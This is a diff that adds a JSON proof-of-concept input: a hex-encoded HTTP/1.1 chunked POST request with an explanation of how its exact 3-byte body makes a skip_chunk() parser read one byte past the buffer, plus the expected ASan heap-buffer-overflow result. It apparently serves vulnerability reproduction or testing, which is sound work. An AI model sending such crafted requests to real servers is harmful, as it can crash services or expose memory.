@@ -1,0 +1,5 @@
+{
+  "hex_bytes": "50 4f 53 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0d 0a 0d 0a 61 62 0d",
+  "explanation": "Complete HTTP/1.1 request whose headers parse cleanly so control reaches skip_chunk() on an exact 3-byte body:\n- request line: POST / HTTP/1.1\\r\\n\n- Host: localhost\\r\\n (HTTP/1.1 well-formedness)\n- Transfer-Encoding: chunked\\r\\n (selects the chunked body path / skip_chunk)\n- blank line \\r\\n (end of headers; hm->body starts immediately after)\n- body: 61 62 0d = \"ab\\r\" (len == 3).\nskip_chunk scans the hex size digits \"ab\" so i == 2, then evaluates if (len < i + 1 || buf[i] != '\\r' || buf[i + 1] != '\\n'). len < i + 1 is 3 < 3, false; buf[2] == '\\r', true; the || therefore evaluates buf[3] — one byte past the 3-byte body buffer.",
+  "expected_effect": "ASan/MSan heap-buffer-overflow READ of size 1 (one-byte OOB read past the exact-sized chunked body)"
+}
